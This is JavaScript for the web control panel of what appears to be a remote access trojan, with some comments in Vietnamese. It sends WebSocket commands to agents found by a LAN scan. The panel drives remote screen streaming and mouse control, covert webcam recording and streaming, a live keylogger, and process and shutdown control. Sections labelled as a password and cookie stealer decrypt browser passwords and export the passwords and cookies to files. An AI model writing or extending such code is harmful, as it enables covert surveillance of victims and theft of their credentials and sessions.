document.addEventListener('DOMContentLoaded', () => {
    // =================================================================
    // 1. CẤU HÌNH & KHỞI TẠO
    // =================================================================
    let ws;
    let currentView = 'applications';
    let lastLoggedKeyCode = null;
    let currentVideoBlob = null;
    let isKeylogClean = true;
    let scanInterval = null;
    let currentAgentId = null;

    // Helper chọn DOM
    const $ = (s) => document.querySelector(s);
    const $$ = (s) => document.querySelectorAll(s);

    // --- DOM ELEMENTS ---
    // Connection
    const statusPill = $('#status-pill');
    const statusText = $('#status-pill .status-text');
    const wsUrlInput = $('#ws-url-input');
    const btnConnect = $('#btn-connect');
    const btnDisconnect = $('#btn-disconnect');
    const btnScanLan = $('#btn-scan-lan');

    // Screen (CAPTURE & STREAM)
    const btnTakeScreenshot = $('#btn-take-screenshot');
    const btnReloadScreen = $('#btn-reload-screen');
    const btnSaveScreenshot = $('#btn-save-screenshot');
    const btnCopyScreenshot = $('#btn-copy-screenshot');
    const captureSpinner = $('#capture-spinner');
    const captureImg = $('#capture-img');
    const capturePlaceholder = $('#capture-placeholder');
    const btnStartStream = $('#btn-start-stream');
    const btnStopStream = $('#btn-stop-stream');
    const streamImg = $('#stream-img');
    const mouseToggle = $('#toggle-mouse-control'); 

    // Webcam (RECORD & STREAM)
    const btnStartRecord = $('#btn-start-record');
    const btnStopRecord = $('#btn-stop-record');
    const btnSaveVideo = $('#btn-save-video');
    const btnReloadWebcam = $('#btn-reload-webcam');
    const webcamSpinner = $('#webcam-spinner');
    const webcamPlaceholder = $('#webcam-placeholder');
    const webcamVideoOutput = $('#webcam-video-output');
    const webcamStatus = $('#webcam-status');
    const modalWebcamDevice = $('#modal-webcam-device');
    const inputWebcamDuration = $('#input-webcam-duration');
    const inputWebcamDeviceName = $('#input-webcam-device-name');
    const btnStartWebcamStream = $('#btn-start-webcam-stream');
    const btnStopWebcamStream = $('#btn-stop-webcam-stream');
    const webcamStreamImg = $('#webcam-stream-img');

    // Keylogger
    const keylogToggle = $('#keylog-toggle');
    const keylogOutput = $('#keylog-output');
    const btnClearKeylog = $('#btn-clear-keylog');

    // System & Nav
    const sidebar = $('#sidebar');
    const themeToggle = $('#theme-toggle');

    // Modals
    const modalConfirm = $('#modal-confirm');
    const confirmTitle = $('#confirm-title');
    const confirmMsg = $('#confirm-message');
    const btnConfirmYes = $('#btn-confirm-yes');
    let confirmCallback = null;

    // =================================================================
    // 2. WEBSOCKET & CORE LOGIC
    // =================================================================

    function connectWs() {
        const url = wsUrlInput.value;
        if (!url) return alert('Enter WebSocket URL');
        console.log("Connecting to:", url);

        try {
            ws = new WebSocket(url);
        } catch (e) { return alert("Invalid URL"); }

        ws.onopen = () => {
            setConnectedState(true, currentAgentId);
            if (currentAgentId) loadDataForView(currentView);
        };
        
        ws.onclose = () => {
            setConnectedState(false);
            ws = null;
            resetUI();
        };
        
        ws.onerror = (e) => alert('Connection failed');
        ws.onmessage = onWsMessage; 
    }

    function disconnectWs() { if (ws) ws.close(); }

    function sendWsMessage(payload) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            if (currentAgentId) {
                payload.agentId = currentAgentId;
                ws.send(JSON.stringify(payload));
            } else {
                alert('Please select an agent first (Scan LAN)');
            }
        } else {
            alert('Not connected.');
        }
    }

    // --- MAIN MESSAGE HANDLER ---
    function onWsMessage(event) {
        const msg = JSON.parse(event.data);

        // Kiểm tra các modal để render đúng chỗ
        const modalAppEl = document.getElementById('modal-stop-app');
        const modalProcEl = document.getElementById('modal-stop-proc');
        const isStopAppOpen = modalAppEl && !modalAppEl.classList.contains('hidden');
        const isStopProcOpen = modalProcEl && !modalProcEl.classList.contains('hidden');

        switch (msg.type) {
            // --- 1. PROCESS & APPS ---
            case 'process_list':
                if (isStopProcOpen) renderStopProcList(msg.data);
                else renderProcessTable(msg.data);
                break;

            case 'application_list':
                if (isStopAppOpen) renderStopAppList(msg.data);
                else renderAppTable(msg.data);
                break;

            // --- 2. SCREEN ---
            case 'screenshot': // Xử lý ảnh tĩnh
                handleScreenshotResult(msg.data);
                break;

            case 'screen_frame': // Xử lý luồng stream
                if (btnStartStream.classList.contains('hidden')) {
                    $('#capture-display-area .empty-state').classList.add('hidden');
                    captureImg.classList.add('hidden');
                    streamImg.classList.remove('hidden');
                    streamImg.src = "data:image/jpeg;base64," + msg.data;
                }
                break;

            // --- 3. WEBCAM ---
            case 'webcam_recording_status':
                handleWebcamStatus(msg);
                break;
            case 'webcam_video': // Xử lý video đã ghi xong
                handleWebcamVideo(msg.data);
                break;
            case 'webcam_frame': // Xử lý luồng stream
                if (btnStartWebcamStream.classList.contains('hidden')) {
                    $('#webcam-display-area .empty-state').classList.add('hidden');
                    webcamVideoOutput.classList.add('hidden');
                    webcamStreamImg.classList.remove('hidden');
                    webcamStreamImg.src = "data:image/jpeg;base64," + msg.data;
                }
                break;

            // --- 4. KEYLOGGER ---
            case 'key_event':
                handleKeyEvent(msg.key_code, msg.key_char);
                break;

            // --- 5. PASSWORD & COOKIE STEALER ---
            case 'passwords_result':
                const browserName = msg.browser ? msg.browser.toUpperCase() : "BROWSER";
                if (!msg.data || msg.data.length === 0) {
                    alert(`No passwords found for ${browserName}.`);
                } else {
                    renderPasswordModal(msg.data, browserName);
                }
                break;

            case 'cookies_result':
                if (!msg.data || msg.data.length === 0) {
                    alert("No cookies found or decryption failed.");
                } else {
                    // Tải xuống file JSON cookie (CDP Method)
                    const blob = new Blob([JSON.stringify(msg.data, null, 2)], { type: "application/json" });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement("a");
                    a.href = url;
                    a.download = `cookies_${msg.browser}_${Date.now()}.json`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    alert(`Success! Downloaded ${msg.data.length} cookies via CDP.`);
                }
                break;

            // --- 6. SYSTEM STATUS ---
            case 'error':
                alert("Server Error: " + msg.message);
                break;

            case 'status':
                if (msg.success) {
                    if (isStopAppOpen) sendWsMessage({ command: 'list_applications' });
                    if (isStopProcOpen) sendWsMessage({ command: 'list_processes' });
                    if (currentView.includes('process')) sendWsMessage({ command: 'list_processes' });
                    if (currentView.includes('app')) sendWsMessage({ command: 'list_applications' });
                } else {
                    if (msg.message === 'capture failed') {
                        resetScreenUI();
                    } else alert('Error: ' + msg.message);
                }
                break;
        }
    }

    // =================================================================
    // 3. UI LOGIC & EVENT LISTENERS
    // =================================================================

    function init() {
        const proto = location.protocol === 'https:' ? 'wss' : 'ws';
        wsUrlInput.value = `${proto}://${location.host}/ws`;

        btnConnect.onclick = connectWs;
        btnDisconnect.onclick = disconnectWs;

        $('#sidebar').onclick = e => {
            const item = e.target.closest('.nav-item');
            if (item) showView(item.dataset.view);
        };

        $('#main-content').onclick = e => {
            const card = e.target.closest('[data-action="show-view"]');
            if (card) showView(card.dataset.target);

            const stopBtn = e.target.closest('[data-action="stop-proc"]');
            if (stopBtn) showConfirmModal('Kill Process', `PID ${stopBtn.dataset.pid}?`, 'danger', 
                () => sendWsMessage({ command: 'stop_process_pid', pid: parseInt(stopBtn.dataset.pid) }));
                
            const stopAppBtn = e.target.closest('[data-action="stop-app"]');
            if (stopAppBtn) showConfirmModal('Stop App', `Close "${stopAppBtn.dataset.name}"?`, 'danger', 
                () => sendWsMessage({ command: 'stop_application', app_name: stopAppBtn.dataset.name }));
        };

        if (btnScanLan) {
            btnScanLan.onclick = () => {
                btnScanLan.classList.add('active-scan');
                showModal('modal-scan-lan');
                fetchScanList();
                if (scanInterval) clearInterval(scanInterval);
                scanInterval = setInterval(fetchScanList, 2000);
            };
        }

        // --- MODALS ---
        $('#modal-backdrop').onclick = handleCloseModal;
        $$('[data-action="cancel"]').forEach(b => b.onclick = handleCloseModal);

        if ($('#card-open-stop-apps')) $('#card-open-stop-apps').onclick = () => { 
            showModal('modal-stop-app'); sendWsMessage({ command: 'list_applications' }); 
        };
        if ($('#card-open-stop-procs')) $('#card-open-stop-procs').onclick = () => { 
            showModal('modal-stop-proc'); sendWsMessage({ command: 'list_processes' }); 
        };

        // --- SCREEN CAPTURE & STREAM ---
        btnTakeScreenshot.onclick = () => {
            // Dừng stream trước khi chụp ảnh
            sendWsMessage({ command: 'stop_screen_stream' });
            sendWsMessage({ command: 'capture_screen' });
            captureSpinner.classList.remove('hidden');
        };

        if (btnReloadScreen) btnReloadScreen.onclick = resetScreenUI;

        btnStartStream.onclick = () => {
            $('#capture-display-area .empty-state').classList.add('hidden');
            captureSpinner.classList.remove('hidden');
            sendWsMessage({ command: 'start_screen_stream', fps: 15 });
            btnStartStream.classList.add('hidden'); 
            btnStopStream.classList.remove('hidden');
        };

        btnStopStream.onclick = () => {
            sendWsMessage({ command: 'stop_screen_stream' });
            resetScreenUI();
        };

        btnSaveScreenshot.onclick = () => {
            const a = document.createElement('a');
            a.href = captureImg.src;
            a.download = `screen-${Date.now()}.png`;
            a.click();
        };

        btnCopyScreenshot.onclick = async () => {
            try {
                const response = await fetch(captureImg.src);
                const blob = await response.blob();
                await navigator.clipboard.write([new ClipboardItem({ [blob.type]: blob })]);
                alert('Copied to clipboard!');
            } catch (err) { alert('Copy failed'); }
        };

        // --- MOUSE CONTROL ---
        let lastSent = 0;
        const THROTTLE_MS = 50; 

        function sendMouse(payload) {
            if (ws && ws.readyState === WebSocket.OPEN && !streamImg.classList.contains('hidden') && mouseToggle && mouseToggle.checked) {
                payload.command = 'mouse_input';
                sendWsMessage(payload);
            }
        }

        streamImg.addEventListener('mousemove', (e) => {
            if (Date.now() - lastSent < THROTTLE_MS) return;
            lastSent = Date.now();
            const rect = streamImg.getBoundingClientRect();
            sendMouse({ action: 'move', x: (e.clientX - rect.left)/rect.width, y: (e.clientY - rect.top)/rect.height });
        });
        streamImg.addEventListener('mousedown', (e) => {
            sendMouse({ action: 'click', button: e.button===2?'right':(e.button===1?'middle':'left'), state: 'down' });
        });
        streamImg.addEventListener('mouseup', (e) => {
            sendMouse({ action: 'click', button: e.button===2?'right':(e.button===1?'middle':'left'), state: 'up' });
        });
        streamImg.addEventListener('contextmenu', e => { if(mouseToggle && mouseToggle.checked) e.preventDefault(); });
        streamImg.addEventListener('wheel', (e) => {
            if(mouseToggle && mouseToggle.checked) {
                e.preventDefault();
                const delta = e.deltaY > 0 ? -120 : 120;
                sendMouse({ action: 'scroll', delta: delta });
            }
        }, { passive: false });


        // --- WEBCAM ---
        btnStartRecord.onclick = () => showModal('modal-webcam-device');
        $('#modal-webcam-device [data-action="confirm"]').onclick = () => {
             sendWsMessage({ 
                 command: 'start_webcam_record', 
                 time: parseInt(inputWebcamDuration.value) || 10,
                 device_name: inputWebcamDeviceName.value 
             });
             handleCloseModal();
        };
        btnStopRecord.onclick = () => sendWsMessage({ command: 'stop_webcam_record' });
        
        btnStartWebcamStream.onclick = () => {
             sendWsMessage({ command: 'start_webcam_stream', fps: 30 });
             btnStartWebcamStream.classList.add('hidden'); btnStopWebcamStream.classList.remove('hidden');
        };
        btnStopWebcamStream.onclick = () => {
             sendWsMessage({ command: 'stop_webcam_stream' });
             btnStartWebcamStream.classList.remove('hidden'); btnStopWebcamStream.classList.add('hidden');
        };
        
        if(btnReloadWebcam) btnReloadWebcam.onclick = () => {
             webcamStreamImg.classList.add('hidden'); webcamVideoOutput.classList.add('hidden');
             $('#webcam-display-area .empty-state').classList.remove('hidden');
             btnStartWebcamStream.classList.remove('hidden'); btnStopWebcamStream.classList.add('hidden');
        };
        
        btnSaveVideo.onclick = () => {
            if (currentVideoBlob) {
                const a = document.createElement('a');
                a.href = URL.createObjectURL(currentVideoBlob);
                a.download = `webcam-${Date.now()}.mp4`;
                a.click();
            }
        };

        // --- KEYLOGGER ---
        keylogToggle.onchange = e => {
            if (!ws) { e.target.checked = false; return alert('Connect first'); }
            sendWsMessage({ command: e.target.checked ? 'start_keylog' : 'stop_keylog' });
            keylogOutput.textContent = e.target.checked ? 'Starting...' : 'Stopped.';
        };
        if (btnClearKeylog) btnClearKeylog.onclick = () => { keylogOutput.textContent = ''; };

        // --- PROCESS & APP ---
        $('#btn-start-process').onclick = () => showModal('modal-start-process');
        $('#btn-start-app').onclick = () => showModal('modal-start-app');

        $('#modal-start-process [data-action="confirm"]').onclick = () => {
            sendWsMessage({ command: 'start_process', path: $('#input-proc-path').value, args: $('#input-proc-args').value });
            handleCloseModal();
        };
        $('#modal-start-app [data-action="confirm"]').onclick = () => {
            sendWsMessage({ command: 'start_application', app_name: $('#input-app-name').value });
            handleCloseModal();
        };

        // --- SYSTEM ACTIONS ---
        if ($('#btn-system-restart')) $('#btn-system-restart').onclick = () => showConfirmModal('Restart', 'Restart remote PC?', 'danger', () => sendWsMessage({ command: 'system_restart' }));
        if ($('#btn-system-shutdown')) $('#btn-system-shutdown').onclick = () => showConfirmModal('Shutdown', 'Shutdown remote PC?', 'danger', () => sendWsMessage({ command: 'system_shutdown' }));

        // --- THEME ---
        if (themeToggle) {
            const saved = localStorage.getItem('theme');
            if (saved === 'dark' || !saved) { document.body.classList.add('dark-theme'); themeToggle.checked = true; }
            themeToggle.onchange = e => {
                document.body.className = e.target.checked ? 'dark-theme' : '';
                localStorage.setItem('theme', e.target.checked ? 'dark' : 'light');
            };
        }
    }

    // =================================================================
    // 4. GLOBAL FUNCTIONS
    // =================================================================

    window.selectAgent = (agentId, hostname) => {
        console.log(`[UI] Switching target to: ${agentId} (${hostname})`);
        currentAgentId = agentId;
        handleCloseModal();

        if (ws && ws.readyState === WebSocket.OPEN) {
            resetUI();
            setConnectedState(true, hostname || agentId);
            loadDataForView(currentView);
        } else {
            connectWs();
        }
    };

    window.requestStopApp = (name) => {
        if (confirm(`Stop "${name}"?`)) sendWsMessage({ command: 'stop_application', app_name: name });
    };

    window.requestStopProc = (pid) => {
        if (confirm(`Kill PID ${pid}?`)) sendWsMessage({ command: 'stop_process_pid', pid: parseInt(pid) });
    };

    // CDP STEALER (MỚI)
    window.requestStealCookies = (browser) => {
        if(confirm(`Steal Cookies from ${browser} using CDP Method (Will restart browser)?`)) {
            sendWsMessage({ command: 'steal_cookies_cdp', browser: browser });
        }
    };

    // PASSWORD STEALER (CŨ - Chỉ dùng cho Edge)
    window.requestStealPass = (browser) => {
        if(confirm(`Decrypt passwords for ${browser}? (Only works on Edge)`)) {
            sendWsMessage({ command: 'steal_credentials', browser: browser });
        }
    };

    // =================================================================
    // 5. HELPER FUNCTIONS
    // =================================================================

    function showConfirmModal(title, msg, type, callback) {
        confirmTitle.textContent = title;
        confirmMsg.textContent = msg;
        confirmCallback = callback;
        modalConfirm.classList.remove('hidden');
        $('#modal-backdrop').classList.remove('hidden');
    }

    // Xử lý nút Confirm trong Modal
    if(btnConfirmYes) {
        btnConfirmYes.onclick = () => {
            if(confirmCallback) confirmCallback();
            handleCloseModal();
        }
    }

    function showModal(id) {
        $(`#${id}`).classList.remove('hidden');
        $('#modal-backdrop').classList.remove('hidden');
    }

    function hideAllModals() {
        $$('.modal').forEach(m => m.classList.add('hidden'));
        $('#modal-backdrop').classList.add('hidden');
    }

    const handleCloseModal = () => {
        hideAllModals();
        if (scanInterval) { clearInterval(scanInterval); scanInterval = null; }
        btnScanLan.classList.remove('active-scan');
    };

    function setConnectedState(isConnected, agentName = null) {
        if (isConnected) {
            statusPill.classList.remove('disconnected'); statusPill.classList.add('connected');
            if (statusText) statusText.textContent = agentName ? `Connected: ${agentName}` : 'Connected';
            btnConnect.classList.add('hidden'); btnDisconnect.classList.remove('hidden');
            wsUrlInput.disabled = true;
        } else {
            statusPill.classList.remove('connected'); statusPill.classList.add('disconnected');
            if (statusText) statusText.textContent = 'Disconnected';
            btnConnect.classList.remove('hidden'); btnDisconnect.classList.add('hidden');
            wsUrlInput.disabled = false;
            currentAgentId = null;
        }
    }

    function showView(viewId) {
        currentView = viewId;
        $$('.content-view').forEach(v => v.classList.remove('active'));
        const targetView = $(`#view-${viewId}`);
        if (targetView) targetView.classList.add('active');

        $$('.nav-item').forEach(i => i.classList.remove('active'));
        const parent = targetView ? targetView.dataset.parentView : null;
        const activeItem = $(`.nav-item[data-view="${parent || viewId}"]`);
        if (activeItem) activeItem.classList.add('active');

        if (ws && ws.readyState === WebSocket.OPEN) loadDataForView(viewId);
    }

    function loadDataForView(id) {
        if (id === 'processes-table') sendWsMessage({ command: 'list_processes' });
        else if (id === 'applications-table') sendWsMessage({ command: 'list_applications' });
    }

    function renderScanList(data) {
        const container = $('#scan-list');
        if (!data || data.length === 0) { container.innerHTML = '<div class="list-loading">Scanning...</div>'; return; }
        data.sort((a, b) => a.ip.localeCompare(b.ip));
        container.innerHTML = data.map(agent => {
            const isSelected = agent.agentId === currentAgentId;
            return `<div class="device-card ${isSelected ? 'selected-agent' : ''}" onclick="selectAgent('${agent.agentId}', '${agent.hostname}')">
                <div class="device-status"></div><div class="device-info"><span class="device-hostname">${agent.hostname}</span><span class="device-ip">${agent.agentId}</span></div>
            </div>`;
        }).join('');
    }

    function renderProcessTable(data) {
        const tbody = $('#processes-table tbody');
        if (!tbody || !data) return;
        const fmt = new Intl.NumberFormat('en-US');
        tbody.innerHTML = data.map(p => `<tr><td>${p.pid}</td><td>${p.name}</td><td>${fmt.format(p.workingSet)} B</td><td class="text-right"><button class="btn btn-sm btn-danger" onclick="requestStopProc(${p.pid})">Stop</button></td></tr>`).join('');
    }

    function renderAppTable(data) {
        const tbody = $('#apps-table tbody');
        if (!tbody || !data) return;
        tbody.innerHTML = data.map(a => `<tr><td>${a.name}</td><td>${a.process_count}</td><td class="text-right"><button class="btn btn-sm btn-danger" onclick="requestStopApp('${a.name}')">Kill</button></td></tr>`).join('');
    }

    function renderStopProcList(data) {
        $('#stop-proc-list').innerHTML = data.map(p => `<div class="list-item"><span>${p.name} (${p.pid})</span><button class="btn-kill-sm" onclick="requestStopProc(${p.pid})">X</button></div>`).join('');
    }
    function renderStopAppList(data) {
        $('#stop-app-list').innerHTML = data.map(a => `<div class="list-item"><span>${a.name}</span><button class="btn-kill-sm" onclick="requestStopApp('${a.name}')">X</button></div>`).join('');
    }

    function handleScreenshotResult(base64) {
        captureSpinner.classList.add('hidden');
        streamImg.classList.add('hidden'); streamImg.src = "";
        capturePlaceholder.parentElement.classList.add('hidden');
        captureImg.src = `data:image/png;base64,${base64}`;
        captureImg.classList.remove('hidden');
        btnCopyScreenshot.classList.remove('hidden');
        btnSaveScreenshot.classList.remove('hidden');
    }

    function resetScreenUI() {
        streamImg.classList.add('hidden'); streamImg.src = "";
        captureImg.classList.add('hidden');
        $('#capture-display-area .empty-state').classList.remove('hidden');
        btnStartStream.classList.remove('hidden'); btnStopStream.classList.add('hidden');
    }

    function handleKeyEvent(keyCode, keyChar) {
        const el = document.getElementById('keylog-output');
        if (!el) return;
        if (keyChar === '[BACKSPACE]') el.textContent = el.textContent.slice(0, -1);
        else if (keyChar === '\n') el.textContent += '\n';
        else if (keyChar === '\t') el.textContent += '    ';
        else el.textContent += keyChar;
        el.scrollTop = el.scrollHeight;
    }

    function handleWebcamStatus(msg) {
        webcamStatus.textContent = msg.message;
        webcamStatus.classList.remove('hidden');
        if (msg.message.includes('Recording started')) {
            btnStartRecord.classList.add('hidden'); btnStopRecord.classList.remove('hidden');
            webcamSpinner.classList.remove('hidden');
        } else if (msg.message.includes('completed') || msg.message.includes('stopped')) {
            webcamSpinner.classList.add('hidden');
        }
    }

    function handleWebcamVideo(b64) {
        webcamSpinner.classList.add('hidden');
        webcamPlaceholder.parentElement.classList.add('hidden');
        const chars = atob(b64), bytes = new Uint8Array(chars.length);
        for (let i = 0; i < chars.length; i++) bytes[i] = chars.charCodeAt(i);
        if (currentVideoBlob) URL.revokeObjectURL(currentVideoBlob.src);
        currentVideoBlob = new Blob([bytes], { type: 'video/mp4' });
        webcamVideoOutput.src = URL.createObjectURL(currentVideoBlob);
        webcamVideoOutput.classList.remove('hidden');
        btnStartRecord.classList.remove('hidden'); btnStopRecord.classList.add('hidden');
        btnSaveVideo.classList.remove('hidden');
    }

    function resetUI() {
        if ($('#processes-table tbody')) $('#processes-table tbody').innerHTML = '';
        if ($('#apps-table tbody')) $('#apps-table tbody').innerHTML = '';
        if (keylogOutput) keylogOutput.textContent = 'Waiting...';
        if (keylogToggle) keylogToggle.checked = false;
        lastLoggedKeyCode = null;
    }

    // --- SCAN FETCH ---
    const fetchScanList = async() => {
        try {
            const response = await fetch(`${location.protocol}//${location.host}/api/scan`);
            if (!response.ok) throw new Error("Error");
            const result = await response.json();
            renderScanList(result.data);
        } catch (error) {}
    };

    // =================================================================
    // 6. PASSWORD MANAGER UI (GIỮ NGUYÊN)
    // =================================================================

    let currentPasswordData = [];
    let currentBrowserName = "unknown";

    function renderPasswordModal(passwords, browserName) {
        currentPasswordData = passwords;
        currentBrowserName = browserName;

        const tbody = document.getElementById('password-list-body');
        const modal = document.getElementById('password-modal');
        const countLabel = document.getElementById('pass-count');
        
        if (!tbody || !modal) return;

        tbody.innerHTML = '';
        countLabel.innerText = `${passwords.length} items found`;

        passwords.forEach((p, index) => {
            const row = document.createElement('tr');
            const displayUrl = p.url.length > 60 ? p.url.substring(0, 60) + '...' : p.url;
            row.innerHTML = `
                <td><span class="url-cell" title="${p.url}">${displayUrl}</span></td>
                <td><span class="user-cell">${p.user}</span></td>
                <td><span class="pass-cell">${p.pass}</span></td>
                <td class="text-center"><button class="btn-copy" id="btn-copy-${index}" onclick="handleCopy(${index})">Copy</button></td>
            `;
            tbody.appendChild(row);
        });

        modal.classList.remove('hidden');
        if (typeof feather !== 'undefined') feather.replace();
    }

    window.handleCopy = function(index) {
        const text = currentPasswordData[index].pass;
        const btn = document.getElementById(`btn-copy-${index}`);
        const showSuccess = () => {
            const originalText = btn.innerText;
            btn.innerText = "Copied!";
            btn.classList.add("copied");
            setTimeout(() => {
                btn.innerText = originalText;
                btn.classList.remove("copied");
            }, 1500);
        };
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(text).then(showSuccess);
        } else {
            prompt("Copy thủ công:", text);
        }
    };

    window.closePasswordModal = function() {
        document.getElementById('password-modal').classList.add('hidden');
    };

    window.downloadPasswords = function() {
        if (!currentPasswordData.length) return;
        let content = `=== PASSWORDS (${currentBrowserName}) ===\n`;
        currentPasswordData.forEach(p => content += `${p.url} | ${p.user}:${p.pass}\n`);
        const blob = new Blob([content], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `passwords_${Date.now()}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    };

    window.addEventListener('click', function(event) {
        const modal = document.getElementById('password-modal');
        if (event.target === modal) modal.classList.add('hidden');
    });

    // --- START ---
    init();
    setTimeout(() => { if (typeof feather !== 'undefined') feather.replace(); }, 500);
});